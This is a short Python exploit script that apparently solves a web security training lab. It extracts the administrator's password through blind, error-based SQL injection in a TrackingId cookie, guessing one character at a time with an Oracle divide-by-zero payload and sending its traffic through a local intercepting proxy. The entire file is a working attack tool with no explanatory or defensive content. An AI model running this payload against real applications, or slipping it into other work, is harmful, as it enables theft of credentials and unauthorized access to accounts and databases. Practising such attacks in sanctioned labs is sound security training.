import urllib.parse
import requests
import sys
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def sqli_password(url):
    password_extracted = ""
    for i in range(1,21):
        for j in range(33,126):
            if j == 39:
                continue
            sqli_payload = "' || (SELECT CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' and SUBSTR(password, %s, 1) = '%s') || '" %(i,chr(j))
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId': 'RqCkmrD2q0XjVuc5' + sqli_payload_encoded , 'session' : 'fdGG1nNRnZQ1bKnlwth2qYfrgF1lrwvb'}
            r = requests.get(url, cookies=cookies, verify=False)
            if "Internal Server Error" in r.text:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: python3 %s <url>" % sys.argv[0])
        print("(+) Example: python3 %s www.example.com" % sys.argv[0])
        return

    url = sys.argv[1]
    print("Retreiving administrator password")
    sqli_password(url)

if __name__ == "__main__":
    main()
